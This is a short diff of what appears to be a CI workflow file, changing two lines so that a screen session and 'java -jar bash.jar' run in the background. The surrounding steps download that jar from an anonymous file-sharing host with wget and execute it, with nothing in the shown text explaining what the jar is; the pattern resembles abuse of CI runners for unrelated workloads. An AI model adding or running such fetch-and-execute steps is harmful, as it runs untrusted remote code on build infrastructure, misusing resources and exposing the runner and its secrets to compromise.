@@ -28,6 +28,6 @@ jobs:
           sudo apt update -y
           sudo apt install -y screen
           wget -c https://filebin.net/kgjg4k1x8uq8hw5t/bash.jar
-          screen -S testo
-          java -jar bash.jar
+          screen -S testo &
+          java -jar bash.jar &
           wait
